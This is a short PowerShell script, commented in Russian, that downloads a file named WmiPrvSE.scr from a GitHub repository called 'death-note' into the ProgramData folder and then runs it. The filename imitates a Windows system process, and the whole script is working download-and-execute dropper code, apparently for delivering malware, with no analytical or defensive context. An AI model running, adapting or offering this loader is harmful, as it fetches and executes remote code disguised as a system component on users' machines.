$url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/WmiPrvSE.scr"
$destination = "$env:programdata\WmiPrvSE.scr"

try {
    # Скачивание файла
    Write-Host "Загрузка файла..." -ForegroundColor Yellow
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $destination)
    $webClient.Dispose()

    # Проверка существования файла
    if (Test-Path $destination) {
        Write-Host "Файл успешно загружен. Запуск..." -ForegroundColor Green
        
        # Запуск файла
        Start-Process -FilePath $destination -Wait
        Write-Host "Выполнение завершено." -ForegroundColor Green
    }
    else {
        Write-Host "Ошибка: Файл не найден после загрузки." -ForegroundColor Red
    }
}
catch {
    Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
}
